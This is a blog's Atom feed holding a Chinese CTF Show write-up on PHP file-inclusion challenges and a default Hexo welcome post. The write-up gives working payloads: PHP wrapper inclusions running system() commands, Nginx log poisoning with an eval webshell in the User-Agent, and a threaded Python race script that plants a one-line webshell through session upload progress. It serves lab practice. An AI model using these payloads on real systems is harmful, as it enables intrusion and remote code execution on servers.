<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zzk6th.github.io</id>
    <title>自由之翼</title>
    <subtitle></subtitle>
    <icon>https://zzk6th.github.io/assets/favicon.ico</icon>
    <link href="https://zzk6th.github.io" />
    <author>
      <name>zzk6th</name>
    </author>
    <updated>2024-02-29T07:20:46.188Z</updated>
    <entry>
        <id>https://zzk6th.github.io/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
        <title>CTF Show文件包含</title>
        <link rel="alternate" href="https://zzk6th.github.io/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
        <content type="html">&lt;h1 id=&#34;web78&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web78&#34;&gt;#&lt;/a&gt; Web78&lt;/h1&gt;
&lt;p&gt;用 php 伪协议绕过&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?file=php://filter/convert.base64-encode/resource=flag.php&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;web79&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web79&#34;&gt;#&lt;/a&gt; web79&lt;/h1&gt;
&lt;p&gt;用 date 伪协议绕过&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=&lt;br /&gt;
?file=data://text/plain,&amp;lt;?= system(&#39;tac flag.p*p&#39;);?&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;或者用 input 大写 php 绕过&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?file=Php://input&lt;br /&gt;
post：&amp;lt;?php system(&#39;ls&#39;);?&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;web80&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web80&#34;&gt;#&lt;/a&gt; Web80&lt;/h1&gt;
&lt;p&gt;上题中 input 的 php 大写绕过 jie 还能用&lt;br /&gt;
&lt;img data-src=&#34;../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_2.png&#34; alt=&#34;Image-1&#34; /&gt;&lt;br /&gt;
php 和 data 伪协议都用不了了，可以包含日志文件&lt;br /&gt;
通过 Wappalyzer 得知中间件是 Nginx&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?file=/var/log/nginx/access.log&lt;br /&gt;
User-Agent: &amp;lt;?php echo 123;phpinfo();eval($_POST[0]);?&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;直接连接蚁剑拿到 flag&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;web81&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web81&#34;&gt;#&lt;/a&gt; web81&lt;/h1&gt;
&lt;p&gt;与上一题一样&lt;br /&gt;
传参&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?file=/var/log/nginx/access.log&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;再改&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;User-Agent: &amp;lt;?php system(&#39;ls&#39;);?&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;回车两次，得到&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;fl0g.php index.php&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然后再改&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;User-Agent: &amp;lt;?php system(&#39;tac fl0g.p*p&#39;);?&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;回车两次，得到最终 flag&lt;br /&gt;
&lt;img data-src=&#34;../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_3.png&#34; alt=&#34;Image-2&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;web82~web86&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web82~web86&#34;&gt;#&lt;/a&gt; Web82~Web86&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;import requests
import io
import threading
 
 
url=&#39;http://b04c7980-d374-4c39-9ebc-a612708262c8.challenge.ctf.show/&#39;
sessionid=&#39;ctfshow&#39;
data=&amp;#123;
&amp;quot;1&amp;quot;:&amp;quot;file_put_contents(&#39;/var/www/html/muma.php&#39;,&#39;&amp;lt;?php eval($_POST[a]);?&amp;gt;&#39;);&amp;quot;
&amp;#125; 
 
&#39;&#39;&#39;
post 传递内容可在网站目录下写入一句话木马。
根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。
sessionid 可控，所以这里即 /tmp/sess_ctfshow。
这样一旦访问成功，就说明木马植入了
&#39;&#39;&#39;
 
 
# /tmp/sess_sessionid 中写入一句话木马。
def write(session): 
fileBytes = io.BytesIO(b&#39;a&#39;*1024*50)
while True:
response=session.post(
url,
data=&amp;#123;
&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;:&#39;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#39;
&amp;#125;,
cookies=&amp;#123;
&#39;PHPSESSID&#39;:sessionid
&amp;#125;,
files=&amp;#123;
&#39;file&#39;:(&#39;ctfshow.jpg&#39;,fileBytes)
&amp;#125;
)
 
 
# 访问 /tmp/sess_sessionid，post 传递信息，保存新木马。
def read(session):
while True:
response=session.post(
url+&#39;?file=/tmp/sess_&#39;+sessionid,
    data=data,
cookies=&amp;#123;
&#39;PHPSESSID&#39;:sessionid
&amp;#125;
)
# 访问木马文件，如果访问到了就代表竞争成功
resposne2=session.get(url+&#39;muma.php&#39;)
if resposne2.status_code==200:
print(&#39;++++++done++++++&#39;)
else:
print(resposne2.status_code)
 
if __name__ == &#39;__main__&#39;:
 
evnet=threading.Event()
# 写入和访问分别设置 5 个线程。
with requests.session() as session:
for i in range(5):
threading.Thread(target=write,args=(session,)).start()
for i in range(5):
threading.Thread(target=read,args=(session,)).start()
 
evnet.set()
 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行脚本并成功写入后即可访问木马。&lt;img data-src=&#34;../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_4.png&#34; alt=&#34;Image-3&#34; /&gt;&lt;br /&gt;
&lt;img data-src=&#34;../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_5.png&#34; alt=&#34;Image-4&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;web87未完待续&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web87未完待续&#34;&gt;#&lt;/a&gt; Web87 (未完待续)&lt;/h1&gt;
</content>
        <category term="wp" scheme="https://zzk6th.github.io/categories/wp/" />
        <updated>2024-02-29T07:20:46.188Z</updated>
    </entry>
    <entry>
        <id>https://zzk6th.github.io/hello-world/</id>
        <title>Hello World</title>
        <link rel="alternate" href="https://zzk6th.github.io/hello-world/"/>
        <content type="html">&lt;p&gt;Welcome to &lt;a href=&#34;https://hexo.io/&#34;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&#34;https://hexo.io/docs/&#34;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&#34;https://hexo.io/docs/troubleshooting.html&#34;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&#34;https://github.com/hexojs/hexo/issues&#34;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo new &lt;span class=&#34;token string&#34;&gt;&#34;My New Post&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/writing.html&#34;&gt;Writing&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo server&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/server.html&#34;&gt;Server&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo generate&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/generating.html&#34;&gt;Generating&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo deploy&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/one-command-deployment.html&#34;&gt;Deployment&lt;/a&gt;&lt;/p&gt;
</content>
        <updated>2024-01-27T11:25:42.668Z</updated>
    </entry>
</feed>
